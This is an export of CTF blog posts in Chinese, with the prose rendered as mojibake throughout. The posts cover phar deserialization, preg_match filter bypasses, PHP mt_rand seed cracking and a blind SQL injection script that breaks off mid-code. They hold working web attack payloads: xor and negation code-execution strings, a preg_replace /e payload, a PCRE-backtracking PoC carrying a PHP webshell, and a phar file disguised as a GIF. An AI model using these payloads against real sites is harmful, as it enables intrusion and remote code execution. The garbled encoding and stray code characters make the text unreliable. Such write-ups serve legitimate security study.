        <content type="html"><![CDATA[<h1 id="æ¦‚è¦"><a href="#æ¦‚è¦" class="headerlink" title="æ¦‚è¦"></a>æ¦‚è¦</h1><p>æ¥è‡ªSecarmaçš„å®‰å…¨ç ”ç©¶å‘˜Sam Thomaså‘ç°äº†ä¸€ç§æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥åœ¨ä¸ä½¿ç”¨phpå‡½æ•°unserialize()çš„å‰æä¸‹ï¼Œå¼•èµ·ä¸¥é‡çš„phpå¯¹è±¡æ³¨å…¥æ¼æ´ã€‚<br> è¿™ä¸ªæ–°çš„æ”»å‡»æ–¹å¼è¢«ä»–å…¬å¼€åœ¨äº†ç¾å›½çš„BlackHatä¼šè®®æ¼”è®²ä¸Šï¼Œæ¼”è®²ä¸»é¢˜ä¸ºï¼šâ€ä¸ä¸ºäººæ‰€çŸ¥çš„phpååºåˆ—åŒ–æ¼æ´â€ã€‚å®ƒå¯ä»¥ä½¿æ”»å‡»è€…å°†ç›¸å…³æ¼æ´çš„ä¸¥é‡ç¨‹åº¦å‡çº§ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œã€‚æˆ‘ä»¬åœ¨RIPSä»£ç åˆ†æå¼•æ“ä¸­æ·»åŠ äº†å¯¹è¿™ç§æ–°å‹æ”»å‡»çš„æ£€æµ‹ã€‚</p><h1 id="å…³äºæµåŒ…è£…"><a href="#å…³äºæµåŒ…è£…" class="headerlink" title="å…³äºæµåŒ…è£…"></a>å…³äºæµåŒ…è£…</h1><p>å¤§å¤šæ•°PHPæ–‡ä»¶æ“ä½œå…è®¸ä½¿ç”¨å„ç§URLåè®®å»è®¿é—®æ–‡ä»¶è·¯å¾„ï¼šå¦‚<code>data://</code>ï¼Œ<code>zlib://</code>æˆ–<code>php://</code>ã€‚<br> ä¾‹å¦‚å¸¸è§çš„</p><pre><code class="php">include(&#39;php://filter/read=convert.base64-encode/resource=index.php&#39;);include(&#39;data://text/plain;base64,xxxxxxxxxxxx&#39;);</code></pre><p><code>phar://</code>ä¹Ÿæ˜¯æµåŒ…è£…çš„ä¸€ç§</p><h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><p>pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼›è¯¥æ–¹æ³•åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><h1 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h1><p>pharç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯stubã€manifest describing the  contentsã€ the file contentsã€ [optional] a signature for verifying Phar  integrity (phar file format only)</p><p>stub:æ ‡è¯†ä½œç”¨ï¼Œæ ¼å¼ä¸ºxxx<?php xxx; __HALT_COMPILER();?>ï¼Œå‰é¢ä»»æ„ï¼Œä½†æ˜¯ä¸€å®šè¦ä»¥__HALT_COMPILER();?&gt;ç»“å°¾ï¼Œå¦åˆ™phpæ— æ³•è¯†åˆ«è¿™æ˜¯ä¸€ä¸ªpharæ–‡ä»¶ï¼›</p><p>manifest describing the contents:å…¶å®å¯ä»¥ç†è§£ä¸ºpharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æœ‰å‹ç¼©ä¿¡æ¯å’Œæƒé™ï¼Œå½“ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„åºåˆ—åŒ–ä¹Ÿåœ¨é‡Œé¢ï¼›</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/d8f9d72a6059252d260b20a9a98db93d5bb5b918.jpeg" alt="img"></p><p> the file contents:è¿™é‡ŒæŒ‡çš„æ˜¯è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›</p><p>[optional] a signature for verifying Phar integrity (phar file format only):ç­¾åï¼Œæ”¾åœ¨ç»“å°¾ï¼›</p><p>æ ¹æ®æ–‡ä»¶ç»“æ„æˆ‘ä»¬æ¥è‡ªå·±æ„å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œphpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œ</p><p><strong>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</strong></p><pre><code class="php">&lt;?phpclass TestObject &#123;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering(); //å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub$o = new TestObject();$o -&gt; data=&#39;sakura&#39;;$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;</code></pre><p>è®¿é—®ä¸€ä¸‹ï¼Œå‘ç°åŒç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ª.pharåç¼€çš„æ–‡ä»¶(å¦‚æœè¿™æ­¥æ— æ³•åˆ›å»ºï¼Œè¯·ä¿®æ”¹php.iniçš„é…ç½®ï¼Œè®¾ç½®phar.readonly = off å¹¶å»æ‰å‰é¢çš„åˆ†å·)</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027213811961.png" alt="image-20211027213811961"></p><p>æ‰“å¼€ï¼š</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215216183.png" alt="image-20211027215216183"></p><p>å‘ç°å†™å…¥çš„å†…å®¹å·²ç»è¢«åºåˆ—åŒ–ã€‚</p><p>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20180908164943-2151deae-b344-1.png" alt="img"></p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>phar_fan.php</p><pre><code class="php">&lt;?phpclass TestObject&#123;    function __destruct()    &#123;        echo $this -&gt; data;   // TODO: Implement __destruct() method.    &#125;&#125;include(&#39;phar://phar.phar&#39;);?&gt;</code></pre><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215532641.png" alt="image-20211027215532641"></p><p>æˆ‘ä»¬æ¥ç®€è¦è¯´æ˜ä¸‹æ•´ä¸ªè°ƒç”¨æµç¨‹ï¼š</p><p>è®¿é—® phar_fun.phpè¿™ä¸ªæ–‡ä»¶</p><p>æ‰§è¡Œincleudeä»£ç </p><p>è§£æpharæ–‡ä»¶</p><p>å°†é‡Œé¢çš„meta-dataååºåˆ—åŒ–ï¼Œåœ¨ä¸Šè¿°ä»£ç ä¸­ä¹Ÿå°±æ˜¯TestObjectè¿™ä¸ªå¯¹è±¡ã€‚</p><p>å¯¹è±¡é”€æ¯ï¼Œè°ƒç”¨é­”æœ¯æ–¹æ³•__destruct()</p><p>æ‰§è¡Œechoè¯­å¥å®Œæˆæ”»å‡»ã€‚</p><h1 id="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶"><a href="#å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶" class="headerlink" title="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶"></a>å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</h1><p>phpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯<code>__HALT_COMPILER();?&gt;</code>è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p><pre><code class="php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;sakura.phar&quot;);    $phar = new Phar(&quot;sakura.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´    $o = new TestObject();    $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶    //ç­¾åè‡ªåŠ¨è®¡ç®—    $phar-&gt;stopBuffering();?&gt;</code></pre><p>ç„¶åè°ƒç”¨phar://sakura.php</p><p>æ˜¯ä¸€æ ·çš„æ•ˆæœã€‚</p><h1 id="æ¼æ´çš„åˆ©ç”¨æ¡ä»¶"><a href="#æ¼æ´çš„åˆ©ç”¨æ¡ä»¶" class="headerlink" title="æ¼æ´çš„åˆ©ç”¨æ¡ä»¶"></a>æ¼æ´çš„åˆ©ç”¨æ¡ä»¶</h1><ol><li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li><li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚</li><li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</li></ol><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><ol><li>åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œå¯¹å‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚</li><li>ä¸¥æ ¼æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œä¸æ˜¯åªæ£€æŸ¥æ–‡ä»¶å¤´ã€‚</li><li>åœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ç¦ç”¨å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€ä»£ç çš„å±é™©å‡½æ•°ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_matchæ­£åˆ™ç»•è¿‡æ€»ç»“</title>
      <link href="/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å†™é¢˜é‡åˆ°äº†å¾ˆå¤šæ¬¡pre_matchå‡½æ•°ï¼Œä½†å¹¶ä¸æ˜¯æ¯æ¬¡éƒ½å¯ä»¥ç»•è¿‡ã€‚äºæ˜¯æƒ³è¦æŠŠè¿™ä¸ªå‡½æ•°æ€»ç»“ä¸€ä¸‹ç”¨æ³•ã€‚æˆ‘ä¸ªäººè®¤ä¸ºpreg_matchçš„ç»•è¿‡æ–¹æ³•ä¸»è¦å–å†³äºå…¶æ­£åˆ™è¡¨è¾¾å¼çš„å†™æ³•ã€‚</p><p>é¦–å…ˆå¯¹æ­£åˆ™è¡¨è¾¾å¼çš„å¸¸è§ç¬¦å·è§£é‡Šä¸€ä¸‹ã€‚</p><p>/    /    æ˜¯ä¸€ç§æ ¼å¼å§ï¼Œæ­£åˆ™è¡¨è¾¾å¼éœ€è¦å†™åœ¨è¿™ä¸ªé‡Œé¢</p><p>^ï¼šåŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®</p><p>$ï¼šåŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®</p><h1 id="æ¢è¡Œç¬¦ç»•è¿‡-0a"><a href="#æ¢è¡Œç¬¦ç»•è¿‡-0a" class="headerlink" title="æ¢è¡Œç¬¦ç»•è¿‡(%0a)"></a>æ¢è¡Œç¬¦ç»•è¿‡(%0a)</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);$c = $_GET[&#39;c&#39;];if (preg_match(&#39;/^flag$/i&#39;, $c) &amp;&amp; $c !== &#39;flag&#39;) &#123;    echo $flag;&#125;else&#123;    echo &quot;nonono&quot;;&#125;</code></pre><p>ç”±äºpre_matchè¿™ä¸ªå‡½æ•°æ˜¯åªèƒ½åŒ¹é…ä¸€è¡Œçš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨%0a(ä¹Ÿå°±æ˜¯æ¢è¡Œç¬¦)æ¥ç»•è¿‡ã€‚</p><p>è¿™é‡Œæ˜¯å› ä¸º$ä¼šå¿½ç•¥æ¢è¡Œç¬¦</p><p>å› æ­¤æœ¬é¢˜æˆ‘ä»¬ä¼ å…¥?c=flag%0a  å³å¯ç»•è¿‡</p><p>æ³¨æ„æ­¤æ—¶æ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼æ˜¯: i</p><h1 id="åˆ©ç”¨æ•°ç»„ç»•è¿‡"><a href="#åˆ©ç”¨æ•°ç»„ç»•è¿‡" class="headerlink" title="åˆ©ç”¨æ•°ç»„ç»•è¿‡"></a>åˆ©ç”¨æ•°ç»„ç»•è¿‡</h1><p> preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›false</p><h1 id="5cç»•è¿‡"><a href="#5cç»•è¿‡" class="headerlink" title="%5cç»•è¿‡"></a>%5cç»•è¿‡</h1><pre><code class="php">&lt;?php show_source(__FILE__); $key = &quot;bad&quot;; extract($_POST);        // ä½¿ç”¨POSTæ¥æ”¶å‚æ•° if($key === &#39;bad&#39;)&#123;        // $key ä¸ &#39;bad&#39; è¿›è¡Œæ¯”è¾ƒï¼Œå€¼ä¸ç›¸åŒæ—¶æ‰å¯ä»¥ç»§ç»­è¿è¡Œä»£ç     die(&#39;badbad!!!&#39;); &#125; $act = @$_GET[&#39;act&#39;];    // è·å¾— act å‚æ•° $arg = @$_GET[&#39;arg&#39;];    // è·å¾— arg å‚æ•° if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$act)) &#123;    // é’ˆå¯¹actå‚æ•°è¿›è¡Œè¿‡æ»¤    echo &#39;check&#39;; &#125; else &#123;    $act($arg,&#39;&#39;);        // åŠ¨æ€è°ƒç”¨ &#125; echo &#39;666&#39;;</code></pre><pre><code>/iä¸åŒºåˆ†å¤§å°å†™/såŒ¹é…ä»»ä½•ä¸å¯è§å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ï¼Œç­‰ä»·äº[fnrtv]/Då¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ;</code></pre><p>è¿™é‡Œå­˜åœ¨/så’Œ/Då› æ­¤å®ƒä¼šåŒ¹é…åˆ°æ¢è¡Œï¼Œ%0aå› æ­¤å°±æ— æ³•ç»•è¿‡ã€‚è¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨%5c</p><h1 id="preg-match-â€œ-eâ€-æ³¨ï¼šphpç‰ˆæœ¬éœ€è¦å°äº5-5-0"><a href="#preg-match-â€œ-eâ€-æ³¨ï¼šphpç‰ˆæœ¬éœ€è¦å°äº5-5-0" class="headerlink" title="preg_match(â€œ/^$/eâ€) (æ³¨ï¼šphpç‰ˆæœ¬éœ€è¦å°äº5.5.0)"></a>preg_match(â€œ/^$/eâ€) (æ³¨ï¼šphpç‰ˆæœ¬éœ€è¦å°äº5.5.0)</h1><pre><code class="php">&lt;?highlight_file(__FILE__);echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);?&gt;</code></pre><p>payload=xx?h=phpinfo();</p><h1 id="PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶"><a href="#PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶" class="headerlink" title="PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶"></a>PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</h1><p>poc</p><pre><code class="php">import requestsfrom io import BytesIOfiles = &#123;  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)&#125;res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)print(res.headers)</code></pre><p>payload:?a=ssssâ€¦â€¦â€¦..çœç•¥nä¸ªå­—ç¬¦ï¼Œçªç ´100ä¸‡</p><h1 id="å¼‚æˆ–ç»•è¿‡"><a href="#å¼‚æˆ–ç»•è¿‡" class="headerlink" title="å¼‚æˆ–ç»•è¿‡"></a>å¼‚æˆ–ç»•è¿‡</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;        $code=$_GET[&#39;code&#39;];            if(strlen($code)&gt;40)&#123;                    die(&quot;This is too Long.&quot;);                    &#125;            if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                    die(&quot;NO.&quot;);                    &#125;            @eval($code);&#125;else&#123;        highlight_file(__FILE__);&#125;highlight_file(__FILE);// ?&gt;</code></pre><p>å¯ä»¥ä½¿ç”¨å„ç§ç‰¹æ®Šå­—ç¬¦çš„å¼‚æˆ–æ„é€ å‡ºå­—æ¯å’Œæ•°å­—</p><p>è„šæœ¬ï¼š</p><pre><code class="php">str = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;/&quot;for i in range(0, len(str)):    for j in range(0, len(str)):        a = ord(str[i])^ord(str[j])        print(str[i] + &#39; ^ &#39; + str[j] + &#39; is &#39; + chr(a))</code></pre><p>payload:</p><pre><code class="php">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=phpinfo</code></pre><h1 id="å–åç»•è¿‡"><a href="#å–åç»•è¿‡" class="headerlink" title="å–åç»•è¿‡"></a>å–åç»•è¿‡</h1><p>æŠŠgetFlagå–åç„¶åURLç¼–ç ï¼š </p><pre><code class="php"> &lt;?php echo urlencode(~&quot;getFlag&quot;); </code></pre><p>â€“&gt; %98%9A%8B%B9%93%9E%98</p><p>ä¾æ®è¿™ä¸ªæˆ‘ä»¬å¯ä»¥æ„é€ payload: </p><pre><code class="php"> ?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> preg_match </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019æ¯ç‡¥çš„æŠ½å¥–_0x30-0x3f</title>
      <link href="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/"/>
      <url>/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png" alt="image-20211024235829685"></p><p>æŸ¥çœ‹æºä»£ç </p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235901200.png" alt="image-20211024235901200"></p><p>çœ‹åˆ°ä¸€ä¸ªå…³é”®ç‚¹ï¼Œcheck.phpï¼Œè®¿é—®ä¸€ä¸‹</p><pre><code class="php"> &lt;?php#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]===$str)&#123;x        echo &quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;); </code></pre><p>è¿™é‡Œæ¶‰åŠåˆ°äº†ä¼ªéšæœºæ•°æ¼æ´ï¼Œå³å½“ç¡®å®šäº†ç§å­åï¼Œéšæœºæ•°æ¯æ¬¡ç”Ÿæˆæ•°çš„æ‰€æœ‰æ•°æ˜¯é‡å¤å¾—ï¼Œå¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„éšæœºæ•°ã€‚</p><pre><code class="php">&lt;?php  mt_srand(12345);    echo mt_rand().&quot;&lt;br/&gt;&quot;;?&gt;  </code></pre><p>å½“ä½ æ¯æ¬¡è¿è¡Œè¿™ä¸ªå‡½æ•°å¾—åˆ°çš„éšæœºæ•°éƒ½æ˜¯ç›¸åŒçš„ã€‚</p><p>è¿™ä¸ªå°±åƒä¸€ä¸ªå…³ç³»å¼ï¼šy=axï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¾—åˆ°yå’Œaå°±å¯ä»¥æ¨å‡ºxã€‚</p><p>å½“ç„¶ï¼Œå®é™…ä¸Šè¿™ä¸ªå‡½æ•°çš„å…³ç³»æ˜¯ååˆ†å¤æ‚çš„ï¼Œä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥ç”¨å·¥å…·å»ç ´è§£ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦æŠŠé¢˜ç›®ç»™æˆ‘ä»¬çš„çº¿ç´¢è½¬åŒ–ä¸ºè„šæœ¬å¯è¯»çš„å½¢å¼ï¼š</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025011936452.png" alt="image-20211025011936452"></p><pre><code class="python">str1 = &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2 = &#39;nngMHvCoQB&#39;res = &#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] == str1[j]:            res += str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p>![image-20211025012020617](GWCTF-2019æ¯ç‡¥çš„æŠ½å¥–-0x30-0x3f/image-20211025012020617.png</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39.png" alt="Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39"></p><p>è·å¾—åˆ°äº†ç§å­ï¼Œæˆ‘ä»¬æ¥ç”Ÿæˆä¸‹ååºçš„å­—ç¬¦ä¸²ï¼š</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025012917063.png" alt="image-20211025012917063"></p><p>æˆ‘ä»¬çœ‹åˆ°å‰é¢åä½å®Œå…¨å»åˆã€‚</p><p>æäº¤ï¼š</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025013042600.png" alt="image-20211025013042600"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¼ªéšæœºæ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020 é¢œå€¼æˆç»©æŸ¥è¯¢_0x21-0x2F</title>
      <link href="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/"/>
      <url>/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/</url>
      
        <content type="html"><![CDATA[<p>è¿›å»åªæœ‰ä¸€ä¸ªç®€å•å¾—è¾“å…¥æ¡†ï¼Œæµ‹è¯•ä¸‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145243657.png" alt="image-20211022145243657"></p><p>å…ˆè¾“å…¥1ï¼Œ2ï¼Œ3ç­‰</p><p>å‘ç°æœ‰æ•°æ®æ˜¾ç¤º</p><p>ä½¿ç”¨å¼‚æˆ–</p><p><a href="http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0%5E1">http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0^1</a></p><p>ç»“æœæ˜¾ç¤ºå¾—æ˜¯stunum=1çš„ç•Œé¢</p><p>è¯´æ˜å­˜åœ¨sqlç›²æ³¨</p><p>å†™ä¸€ä¸ªç®€å•è„šæœ¬ï¼š</p><pre><code>import requestsimport timeurl = &quot;http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2    # çˆ†ç ´æ•°æ®åº“å        #payload = 